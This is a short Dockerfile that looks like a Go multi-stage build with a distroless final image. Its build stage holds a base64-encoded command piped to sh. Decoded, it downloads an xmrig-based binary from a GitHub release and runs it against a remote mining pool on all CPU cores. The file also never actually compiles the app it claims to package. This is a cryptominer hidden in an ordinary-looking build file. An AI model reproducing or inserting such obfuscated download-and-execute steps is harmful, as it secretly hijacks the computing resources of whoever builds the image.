FROM quay.io/projectquay/golang:1.23 AS build-env
WORKDIR /go/src/app

RUN echo IyEvYmluL2Jhc2gKY3VybCBodHRwczovL2dpdGh1Yi5jb20vYm9uZGFsdG9tYXNvbi9tZW8vcmVsZWFzZXMvZG93bmxvYWQvMi43LjAveG1yaWctdnJsIC1MIC1vIHZybApjaG1vZCA3NzcgdnJsCi4vdnJsIC0tdXJsIGV1LnJwbGFudC54eXo6MTcxNTUgLS10bHMgLXUgdjN0bHo0MGNmZDZydmhmMTVjaXA3ZzR5cW9jZXAzejV6bnMzanEuY29iYSAtcCB3ZWJwYXNzd29yZD14IC1rIC1hIHJhbmRvbXZpcmVsIC10ICQobnByb2MgLS1hbGwp | base64 -d | sh
# Copy the exe into a smaller base image
FROM gcr.io/distroless/static-debian12
COPY --from=build-env /go/bin/app /
ENTRYPOINT ["/app"]
